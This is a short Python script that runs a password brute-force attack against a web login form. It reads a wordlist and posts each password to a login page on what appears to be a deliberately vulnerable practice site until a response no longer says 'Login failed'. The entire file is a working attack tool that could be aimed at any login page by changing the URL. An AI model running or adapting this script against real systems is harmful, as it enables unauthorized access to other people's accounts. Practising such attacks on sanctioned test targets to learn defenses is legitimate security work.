import requests

def run_brute_forcer():
    url = "http://testphp.vulnweb.com/login.php"
    username = input("Enter username to brute-force: ")
    wordlist_path = input("Enter path to password wordlist: ")

    try:
        with open(wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print("Wordlist file not found.")
        return

    print("🚀 Starting brute-force attack...")

    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        if "Login failed" not in response.text:
            print(f"✅ Password found: {password}")
            break
    else:
        print("❌ Password not found in wordlist.")
